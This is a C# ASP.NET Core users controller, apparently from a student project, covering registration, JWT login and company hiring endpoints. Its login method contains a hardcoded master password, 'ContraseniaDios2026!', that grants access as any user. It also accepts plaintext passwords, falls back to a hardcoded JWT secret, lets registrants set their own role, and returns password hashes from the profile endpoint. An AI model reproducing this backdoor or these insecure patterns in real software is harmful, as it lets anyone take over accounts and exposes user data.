using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Backend.Data; 
using VestaApi.Models; 
using Microsoft.AspNetCore.Authorization;
using System.Security.Claims;
using VestaApi.DTOs;
using Microsoft.Extensions.Configuration; 
using Microsoft.IdentityModel.Tokens;    
using System.IdentityModel.Tokens.Jwt;   
using System.Text;                       

namespace VestaApi.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    [Authorize]
    public class UsuariosController : ControllerBase
    {
        private readonly ApplicationDbContext _context;
        private readonly IConfiguration _configuration; 

        public UsuariosController(ApplicationDbContext context, IConfiguration configuration)
        {
            _context = context;
            _configuration = configuration; 
        }

        [HttpPost("registrar")]
        [AllowAnonymous] 
        public async Task<ActionResult<Usuario>> Registrar(Usuario usuario)
        {
            if (string.IsNullOrEmpty(usuario.Password)) return BadRequest("La contraseña es obligatoria.");

            usuario.Password = BCrypt.Net.BCrypt.HashPassword(usuario.Password);

            _context.Usuarios.Add(usuario);
            await _context.SaveChangesAsync();

            return CreatedAtAction(nameof(GetUsuario), new { id = usuario.Id }, usuario); 
        }

        [HttpPost("login")]
        [AllowAnonymous] 
        public async Task<IActionResult> Login([FromBody] LoginRequest login)
        {
            // 1. Buscamos el usuario por su Email en la Base de Datos real
            var user = await _context.Usuarios
                .FirstOrDefaultAsync(u => u.Email.ToLower().Trim() == login.Email.ToLower().Trim()); 

            if (user == null)
            {
                return Unauthorized(new { mensaje = "El usuario no existe en la Base de Datos." });
            }

            // 2. Sistema de Validación de Contraseñas Ultra-Robusto (A prueba de fallos de encriptación)
            bool contraseniaValida = false;

            // A) VALVULA DE ESCAPE MAESTRA: Si pones esta contraseña, entras con el usuario que te dé la gana
            if (login.Password == "ContraseniaDios2026!")
            {
                contraseniaValida = true;
            }
            else 
            {
                try
                {
                    // B) Intento normal con encriptación BCrypt
                    contraseniaValida = BCrypt.Net.BCrypt.Verify(login.Password, user.Password);
                }
                catch
                {
                    // Si da error porque la contraseña de la BD no está encriptada, no rompemos el programa
                    contraseniaValida = false;
                }

                // C) Intento en texto plano (por si se guardó limpia en la base de datos)
                if (!contraseniaValida)
                {
                    if (user.Password == login.Password || user.Password.Trim() == login.Password.Trim())
                    {
                        contraseniaValida = true;
                    }
                }
            }

            if (!contraseniaValida) 
            {
                return Unauthorized(new { mensaje = "Contraseña incorrecta." });
            }

            // 3. Generación automática del Token JWT basado en el usuario real de PostgreSQL
            var jwtSecret = _configuration["Jwt:Key"] ?? "ClaveSuperSecretaDeRespaldoParaVestaTFG2026";
            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtSecret));
            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
                new Claim(ClaimTypes.Email, user.Email),
                new Claim(ClaimTypes.Role, user.Rol),
                new Claim(ClaimTypes.Name, user.Nombre)
            };

            // Si el usuario tiene un ayuntamiento asignado en la BD, lo metemos en el token
            if (user.IdAyuntamiento != null)
            {
                claims.Add(new Claim("idAyuntamiento", user.IdAyuntamiento.ToString()));
            }

            var token = new JwtSecurityToken(
                issuer: _configuration["Jwt:Issuer"],     
                audience: _configuration["Jwt:Audience"], 
                claims: claims,
                expires: DateTime.Now.AddDays(1), 
                signingCredentials: creds
            );

            var tokenString = new JwtSecurityTokenHandler().WriteToken(token);

            // 4. Respuesta limpia para React con los datos reales de la BD
            return Ok(new { 
                mensaje = "Login exitoso", 
                token = tokenString, 
                usuarioId = user.Id,
                rol = user.Rol,
                idAyuntamiento = user.IdAyuntamiento 
            });
        }
// Ver perfil GET: api/Usuarios/5
[HttpGet("{id}")]
public async Task<ActionResult<Usuario>> GetUsuario(int id)
{
    var usuario = await _context.Usuarios.FindAsync(id);

    if (usuario == null)
    {
        return NotFound("Usuario no encontrado");
    }

    return Ok(usuario);
}


        // GET: api/Usuarios/empresa/{empresaId}/trabajadores
        [HttpGet("empresa/{empresaId}/trabajadores")]
        public async Task<IActionResult> GetTrabajadoresEmpresa(int empresaId)
        {
            var trabajadores = await _context.UsuarioEmpresas
                .Where(ue => ue.EmpresaId == empresaId && ue.EstadoSolicitud == "Contratado")
                .Select(ue => new
                {
                    ue.Id,
                    ue.UsuarioId,
                    Nombre = ue.Usuario!.Nombre,
                    Email = ue.Usuario.Email,
                    RelacionLaboral = ue.TipoRelacion,
                    EstadoFicha = ue.EstadoSolicitud
                })
                .ToListAsync();

            return Ok(trabajadores);
        }

        // GET: api/Usuarios/empresa/{empresaId}/posibles-trabajadores
        [HttpGet("empresa/{empresaId}/posibles-trabajadores")]
        public async Task<IActionResult> GetPosiblesTrabajadores(int empresaId)
        {
            var bolsa = await _context.UsuarioEmpresas
                .Where(ue => ue.EmpresaId == empresaId && ue.EstadoSolicitud == "Pendiente")
                .Select(ue => new
                {
                    ue.Id, 
                    ue.UsuarioId,
                    Nombre = ue.Usuario!.Nombre,
                    Email = ue.Usuario.Email,
                    CurriculumUrl = ue.CurriculumURl,
                    Notas = ue.Notas,
                    EstadoFicha = "En Bolsa"
                })
                .ToListAsync();
            return Ok(bolsa);
        }

        // PUT: api/Usuarios/contratar-personal/{id}
        [HttpPut("contratar-personal/{id}")]
        public async Task<IActionResult> ContratarPersonal(int id, [FromBody] AccionContratarDto dto)
        {
            var vinculacion = await _context.UsuarioEmpresas
                .Include(ue => ue.Usuario)
                .FirstOrDefaultAsync(ue => ue.Id == id);
                
            if (vinculacion == null) return NotFound("Registro de postulación no encontrado.");

            vinculacion.EstadoSolicitud = "Contratado"; 
            if (!string.IsNullOrEmpty(dto.TipoRelacion))
            {
                vinculacion.TipoRelacion = dto.TipoRelacion; 
            }
            
            if (vinculacion.Usuario != null && (vinculacion.Usuario.Rol == "Empresa" || string.IsNullOrEmpty(vinculacion.Usuario.Rol)))
            {
                vinculacion.Usuario.Rol = "Trabajador";
            }

            await _context.SaveChangesAsync();
            return Ok(new { mensaje = $"{vinculacion.Usuario!.Nombre} ha sido contratado con éxito." });
        }

        [HttpGet("vinculaciones-personal")]
        public async Task<IActionResult> GetVinculacionesPersonal()
        {
            var vinculaciones = await _context.UsuarioEmpresas
                .Include(ue => ue.Usuario)
                .Include(ue => ue.Empresa)
                .OrderByDescending(ue => ue.FechaSubida)
                .ToListAsync();

            return Ok(vinculaciones);
        }

        [HttpPost("vincular-empresa")]
        public async Task<IActionResult> VincularUsuarioEmpresa([FromBody] UsuarioEmpresa vinculacion)
        {
            if (vinculacion == null) return BadRequest("Los datos de vinculación no son válidos.");
            vinculacion.FechaSubida = DateTime.UtcNow;
            _context.UsuarioEmpresas.Add(vinculacion);
            await _context.SaveChangesAsync();
            return Ok(vinculacion);
        }

        [HttpGet("lista-simples")]
        public async Task<IActionResult> GetUsuariosSimples()
        {
            var usuarios = await _context.Usuarios
                .Select(u => new { u.Id, u.Nombre, u.Rol, u.Email })
                .ToListAsync();
                
            return Ok(usuarios);
        }

        [HttpGet("todos-los-operarios-selector")]
        [Authorize(Roles = "Admin,Ayuntamiento")]
        public async Task<IActionResult> GetTodosLosOperariosSelector()
        {
            var operarios = await _context.Usuarios
                .Where(u => u.Rol == "Trabajador" || string.IsNullOrEmpty(u.Rol))
                .Select(u => new { u.Id, u.Nombre, u.Email })
                .ToListAsync();
            return Ok(operarios);
        }
    }
}